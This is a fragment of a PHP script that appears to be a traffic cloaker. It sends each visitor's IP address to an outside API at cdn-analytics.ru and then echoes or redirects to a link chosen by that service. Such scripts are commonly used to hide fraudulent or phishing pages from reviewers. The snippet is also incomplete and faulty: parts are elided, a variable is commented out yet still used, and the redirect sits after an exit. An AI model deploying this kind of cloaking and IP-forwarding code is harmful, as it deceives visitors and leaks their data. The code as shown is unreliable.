<?
 session_start();
 $post["ip"] = $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( $_SERVER["HTTP_X_FORWARDED_FOR"] ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"] );
 ...
 $curl = curl_init("https://cdn-analytics.ru/api/check_ip");
...
if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
   ...
   //$znak = ($_SERVER['QUERY_STRING']) ? '&' : '?';
   echo $api_reqest->link . '?' . $_SERVER['QUERY_STRING'];exit;
   header('Location: '.$api_reqest->link . $znak . $_SERVER['QUERY_STRING'], true, 302);
 }